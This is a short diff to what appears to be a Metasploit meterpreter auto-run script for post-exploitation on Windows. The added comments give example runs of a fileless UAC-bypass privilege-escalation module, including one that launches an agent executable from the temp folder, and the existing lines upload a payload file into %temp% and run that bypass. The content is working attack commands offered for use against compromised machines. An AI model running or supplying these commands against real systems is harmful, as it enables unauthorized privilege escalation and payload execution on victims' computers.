@@ -1,3 +1,10 @@
+##
+# Add module auto-run options as 'arguments' to further enumeration ..
+# example: run post/windows/escalate/enigma_fileless_uac_bypass CHECK_VULN=true
+# example: run post/windows/escalate/enigma_fileless_uac_bypass USE_POWERSHELL=true
+# example: run post/windows/escalate/enigma_fileless_uac_bypass USE_POWERSHELL=true VULN_SOFT=CompMgmtLauncher.exe
+# example: run post/windows/escalate/enigma_fileless_uac_bypass USE_POWERSHELL=true EXEC_COMMAND="start %temp%\\agent.exe"
+##
 sysinfo
 upload IPATH/output/N4m %temp%\\N4m
 run post/windows/escalate/enigma_fileless_uac_bypass
